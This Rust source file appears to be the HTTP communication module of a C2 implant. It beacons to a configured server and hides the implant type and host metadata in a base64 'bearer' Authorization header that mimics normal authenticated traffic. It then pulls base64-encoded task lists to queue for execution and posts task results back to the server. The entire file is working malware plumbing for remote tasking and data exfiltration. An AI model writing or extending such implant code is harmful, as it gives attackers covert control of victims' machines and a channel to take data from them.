use std::sync::{Arc, Mutex, mpsc};
use std::sync::mpsc::{Receiver, Sender};
use super::base_comms::communication;
use crate::models::{rustyTask::rustyTask,rustyTaskResult::rustyTaskResult,rustyMetadata::rustyMetadata};
use crate::models::c2Message::c2Message;
use base64::{Engine as _, engine::general_purpose};
use bytes::BytesMut;
use reqwest::header;
use crate::functions::serialization::serialize;
use crate::IMPLANT_TYPE;


pub struct httpComms
{
    pub connect_address: String,
    pub connect_port: i32,
    pub is_secure: bool,
    pub connection_attempts: i32,
    pub  uris : Vec<String>,
    pub cookies: Vec<String>,
    pub request_headers: Vec<String>,
    pub user_agent: String,
    pub outbound_tasks: mpsc::Sender<rustyTask>,
    pub inbound_task_results: mpsc::Receiver<rustyTaskResult>,
    pub metadata: Arc<Mutex<rustyMetadata>>,
}

impl httpComms
{
    pub fn new(connect_address: String, connect_port: i32, is_secure: bool, connection_attempts: i32, uris: Vec<String>, cookies: Vec<String>, request_headers: Vec<String>,
               user_agent: String, metadata: Arc<Mutex<rustyMetadata>>,inbound_tasks: Sender<rustyTask>, outbound_task_results: Receiver<rustyTaskResult>) -> Self
    {
        println!("Creating httpComms");
        return Self
        {
            connect_address,
            connect_port,
            is_secure,
            connection_attempts,
            uris,
            cookies,
            request_headers,
            user_agent,
            metadata,
            outbound_tasks: inbound_tasks,
            inbound_task_results: outbound_task_results,
        }
    }

    fn handleCommResp(&self, response: reqwest::blocking::Response)
    {
        println!("Handling response");
        //deserialize the inbount byte[] into a c2Message object
        match &response.bytes()
        {
            Ok(bytes) =>
            {
                println!("Got data");
                match  String::from_utf8(bytes.to_vec())
                {
                    Ok(text) =>
                    {
                        println!("got json string");
                        println!("text: {}",text);
                        match serde_json::from_str::<Vec<c2Message>>(&text)
                        {
                            Ok(deser_messages_result) =>
                                {
                                    for deser_result in deser_messages_result
                                    {
                                        println!("got c2Message");
                                        let msg: c2Message = deser_result;
                                        //deserialize the c2Message's data into a rustyTask object
                                        let decoded_bytes = match general_purpose::STANDARD.decode(&msg.task_data)
                                        {
                                            Ok(bytes) => bytes,
                                            Err(e) => {
                                                println!("Error decoding base64: {}", e);
                                                return;
                                            }
                                        };
                                        match serde_json::from_slice::<Vec<rustyTask>>(&decoded_bytes)
                                        {
                                            Ok(newtask_array) =>
                                                {
                                                    for newtask in newtask_array
                                                    {
                                                        println!("got rustyTask");
                                                        match self.outbound_tasks.send(newtask)
                                                        {
                                                            Ok(_) => println!("Successfully queued inbound task"),
                                                            Err(e) => println!("Failed to send demo task: {}", e)
                                                        };
                                                    }
                                                }
                                            Err(e) => println!("Error deserializing task array: {}", e),
                                        }
                                    }
                                }
                            Err(e) => println!("Error deserializing bytes: {}", e),
                        }
                    }
                    Err(e) => println!("Error converting bytes to string: {}", e),
                }
            },
            Err(e) => println!("Error getting bytes: {}",e),
        }
    }
}

impl communication for httpComms
{
    //performs a get request to the specified url:port/uri with the specified headers and cookies
    fn GetData(&self)
    {
        println!("Getting data");
        //concat the self connection_addess and connection_port into a url
        let url = format!("http://{}:{}", self.connect_address, self.connect_port);
        println!("url: {}",url);
        // serialize the metadata
        let serialized_metadata = match serialize(&self.metadata.lock().unwrap().clone())
        {
            Ok(serialized) => serialized,
            Err(e) => {
                println!("Error serializing metadata: {}", e);
                return;
            }
        };
        //get a copy of the IMPLANT_TYPE as a byte[]
        let implant_name = IMPLANT_TYPE.clone();
        let implant_name_bytes = implant_name.as_bytes();
        let implant_name_length = implant_name_bytes.len() as u32;  // assuming the length fits in u32
        let mut buf = BytesMut::new();
        buf.extend_from_slice(&implant_name_length.to_le_bytes());  // convert length to bytes in little endian
        buf.extend_from_slice(implant_name_bytes);
        buf.extend(serialized_metadata);

        let final_metadata = buf.freeze();
        // Create a client
        let client = reqwest::blocking::Client::new();
        // Define the headers
        let mut headers = header::HeaderMap::new();
        let b64_metadata: String = general_purpose::STANDARD.encode(&final_metadata);
        let meta_header = format!("bearer {}", b64_metadata);
        headers.insert(header::AUTHORIZATION, header::HeaderValue::from_str(meta_header.as_str()).unwrap());


        let resp = client.get(url).headers(headers).send();
        //check if the response had any contnet
        if let Ok(response) = resp
        {
            if response.status().is_success()
            {
                self.handleCommResp(response);
            }
            else
            {
                println!("Error: {}", response.status());
            }
        }
    }

    fn PostData(&self, data: Vec<u8>)
    {
        println!("Posting data");
        let url = format!("http://{}:{}", self.connect_address, self.connect_port);
        // Create a client
        let client = reqwest::blocking::Client::new();
        // Define the request body
        let body = data;
        // serialize the metadata
        let serialized_metadata = match serialize(&self.metadata.lock().unwrap().clone())
        {
            Ok(serialized) => serialized,
            Err(e) => {
                println!("Error serializing metadata: {}", e);
                return;
            }
        };
        //get a copy of the IMPLANT_TYPE as a byte[]
        let implant_name = IMPLANT_TYPE.clone();
        let implant_name_bytes = implant_name.as_bytes();
        let implant_name_length = implant_name_bytes.len() as u32;  // assuming the length fits in u32
        let mut buf = BytesMut::new();
        buf.extend_from_slice(&implant_name_length.to_le_bytes());  // convert length to bytes in little endian
        buf.extend_from_slice(implant_name_bytes);
        buf.extend(serialized_metadata);
        let final_metadata = buf.freeze();
        let b64_metadata: String = general_purpose::STANDARD.encode(&final_metadata);
        let meta_header = format!("bearer {}", b64_metadata);
        // Define the headers
        let mut headers = header::HeaderMap::new();
        headers.insert(header::CONTENT_LENGTH, header::HeaderValue::from_str(&body.len().to_string()).unwrap());
        headers.insert(header::AUTHORIZATION, header::HeaderValue::from_str(meta_header.as_str()).unwrap());

        let resp = client.post(url).headers(headers).body(body).send();
        //check if resp had any content
        if let Ok(response) = resp
        {
            if response.status().is_success()
            {
                self.handleCommResp(response);
            }
            else
            {
                println!("Error: {}", response.status());
            }
        }
    }
}

